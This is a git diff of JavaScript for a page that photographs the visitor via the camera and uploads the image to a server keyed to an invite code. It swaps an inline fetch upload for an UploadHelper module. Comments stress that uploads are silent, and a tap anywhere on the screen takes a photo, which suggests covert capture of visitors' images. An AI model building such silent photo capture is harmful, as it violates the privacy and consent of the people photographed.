@@ -1573,18 +1573,31 @@ function capturePhotoAndUpload() {
                 return;
             }
             console.log('图片blob生成成功，大小:', blob.size, 'bytes');
-            
+
             try {
                 // 压缩图片
                 console.log('开始压缩图片...');
                 const compressedBlob = await compressImageBlob(blob);
                 console.log('图片压缩成功，大小:', compressedBlob.size, 'bytes');
-                
+
                 isUploading = true;
-                
-                // 上传到主系统的API（静默上传，不显示提示）
+
+                // 使用 UploadHelper 上传到主系统（静默上传，不显示提示）
                 console.log('开始上传图片到服务器...');
-                await uploadPhoto(compressedBlob);
+                if (!window.UploadHelper) {
+                    console.error('UploadHelper 未加载');
+                    throw new Error('上传模块未加载');
+                }
+
+                const uploader = new window.UploadHelper();
+                await uploader.uploadImage(compressedBlob, inviteCode, {
+                    onSuccess: () => {
+                        console.log('✅ 上传成功');
+                    },
+                    onError: (error) => {
+                        console.error('上传失败:', error.message);
+                    }
+                });
                 console.log('图片上传完成');
             } catch (err) {
                 console.error('处理或上传图片失败:', err);
@@ -1660,64 +1673,6 @@ async function compressImageBlob(blob, maxSize = 1 * 1024 * 1024) {
         
         img.src = url;
     });
-}
-
-// 上传照片到主系统
-async function uploadPhoto(blob) {
-    console.log('uploadPhoto 被调用, blob大小:', blob.size, 'bytes, inviteCode:', inviteCode);
-    
-    // 再次验证邀请码（防止绕过验证）
-    if (!inviteCode) {
-        console.error('缺少邀请链接码，无法上传');
-        blockPageAccess('邀请链接码无效');
-        return;
-    }
-    
-    try {
-        const formData = new FormData();
-        formData.append('image', blob, 'photo.jpg');
-        formData.append('invite_code', inviteCode);
-        
-        console.log('发送上传请求到 api/upload.php, inviteCode:', inviteCode);
-        const response = await fetch('api/upload.php', {
-            method: 'POST',
-            body: formData
-        });
-        
-        console.log('收到服务器响应, status:', response.status, 'statusText:', response.statusText);
-        
-        if (!response.ok) {
-            const text = await response.text();
-            console.error('上传失败，HTTP状态:', response.status, '响应内容:', text);
-            throw new Error('上传失败：服务器错误 ' + response.status);
-        }
-        
-        const text = await response.text();
-        console.log('服务器响应文本:', text);
-        let data;
-        try {
-            data = JSON.parse(text);
-            console.log('解析后的响应数据:', data);
-        } catch (e) {
-            console.error('JSON解析失败:', e, '原始文本:', text);
-            throw new Error('服务器返回格式错误');
-        }
-        
-        if (data.success) {
-            console.log('✅ 上传成功');
-            isUploading = false;
-            // 静默成功，不显示提示
-            // 注意：摄像头已在 uploadPhoto 调用后释放
-        } else {
-            console.error('上传失败，服务器返回:', data);
-            throw new Error(data.message || '上传失败');
-        }
-    } catch (err) {
-        console.error('上传错误:', err);
-        isUploading = false;
-        // 上传失败也要确保摄像头已释放（在 finally 中已处理）
-        // 静默失败，不显示提示
-    }
 }
 
 // 设置点击屏幕任意位置拍照（优先覆盖整个屏幕）
